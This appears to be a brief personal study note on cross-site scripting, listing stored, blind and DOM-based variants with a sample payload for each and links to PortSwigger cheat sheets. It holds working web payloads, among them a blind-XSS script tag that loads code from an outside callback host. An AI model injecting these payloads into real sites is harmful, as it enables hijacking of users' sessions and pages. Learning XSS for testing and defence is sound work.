# looking at every single XSS attack

## Stored XSS

Payload is sent to the server then the payload is being called

## payload

```javascript
"> <script>alert(0)</script>
```

## Blind XSS

A type of stored xss

It pops up in a page you cant see, 
uses XSS hunter

```javascript
"><script src=https://insider.css.ht></script>
```

## DOM based XSS

```
?%27><script>alert(0)</script>

 ```

 ## Reflected
 

##Cheatsheet

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#waf-bypass-global-objects


https://portswigger.net/web-security/cross-site-scripting/dom-based


